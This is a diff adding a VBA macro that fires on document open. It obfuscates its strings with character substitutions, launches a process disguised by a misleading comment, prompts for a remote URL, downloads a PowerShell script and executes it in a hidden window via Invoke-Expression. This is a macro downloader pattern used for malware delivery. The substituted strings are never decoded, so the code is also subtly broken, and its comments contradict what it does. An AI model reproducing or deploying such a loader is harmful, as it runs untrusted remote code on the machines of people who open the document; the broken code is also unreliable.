@@ -1,1 +1,51 @@
+Sub Document_Open()
+    ' Obfuscated strings with character substitution
+    Dim s1, s2, s3, s4
+    s1 = "WScr" & "1pt" & ".Sh" & "e11"  ' WScript.Shell
+    s2 = "MSXM" & "12" & ".XM1H" & "TTP"  ' MSXML2.XMLHTTP
+    s3 = "p0w" & "ersh" & "e11" & ".ex" & "e"  ' powershell.exe
+    s4 = "svc" & "h0st" & ".ex" & "e"  ' notepad.exe
 
+    Dim ws, ht
+    Set ws = CreateObject(s1)
+    Set ht = CreateObject(s2)
+
+    ws.Run s4, 1, False
+
+    Dim url
+    url = InputBox("Ent" & "3r th" & "3 r3m" & "0t3 s3r" & "v3r UR" & "1 (3.g., htt" & "p://10ca1" & "h0st:80" & "00/pay10ad.ps1):", "S3r" & "v3r UR1")  ' Enter the remote server URL (e -> 3, o -> 0, L -> 1)
+
+    On Error Resume Next
+    ht.Open "G" & "3T", url, False  ' GET (E -> 3)
+    ht.Send
+    If ht.Status = 200 Then
+        Dim psCode
+        psCode = ht.ResponseText
+        Dim cmd
+        cmd = s3 & " -W1n" & "d0wSty" & "13 H1d" & "d3n -C0mmand " & _
+              """$code = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & _
+              Base64Encode(psCode) & "')); Invoke-Expression $code"""  ' powershell -WindowStyle Hidden -Command (e -> 3, o -> 0, i -> 1)
+        ' Execute in notepad.exe's context
+        ws.Run cmd, 0, False
+    Else
+        MsgBox "Fa1" & "13d t0 d0w" & "n10ad sc" & "r1pt. Stat" & "us: " & ht.Status, 16, "3rr" & "0r"  ' Failed to download script
+    End If
+    On Error GoTo 0
+End Sub
+
+' Helper function for Base64 encoding
+Private Function Base64Encode(text As String) As String
+    Dim xml, node
+    Set xml = CreateObject("MSXM12.D0MDocument")
+    Set node = xml.createElement("b64")
+    node.dataType = "bin.base64"
+    node.nodeTypedValue = StrToBytes(text)
+    Base64Encode = node.Text
+End Function
+
+Private Function StrToBytes(str As String) As Variant
+    Dim bytes() As Byte
+    bytes = StrConv(str, vbFromUnicode)
+    StrToBytes = bytes
+End Function
+​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
